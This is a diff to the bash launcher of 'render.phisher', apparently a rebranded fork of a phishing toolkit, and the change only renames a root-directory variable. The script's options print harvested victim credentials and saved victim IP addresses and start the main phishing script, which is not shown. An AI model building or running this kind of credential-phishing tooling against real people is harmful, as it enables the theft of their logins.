@@ -3,9 +3,9 @@
 # https://github.com/render437/render.phisher
 
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/render.phisher"
+	RENDER437_ROOT="/data/data/com.termux/files/usr/opt/render.phisher"
 else
-	export ZPHISHER_ROOT="/opt/render.phisher"
+	export RENDER437_ROOT="/opt/render.phisher"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
@@ -17,16 +17,16 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat $RENDER437_ROOT/auth/usernames.dat 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+	cat $RENDER437_ROOT/auth/ip.txt 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $ZPHISHER_ROOT
+	cd $RENDER437_ROOT
 	bash ./render.phisher.sh
 fi
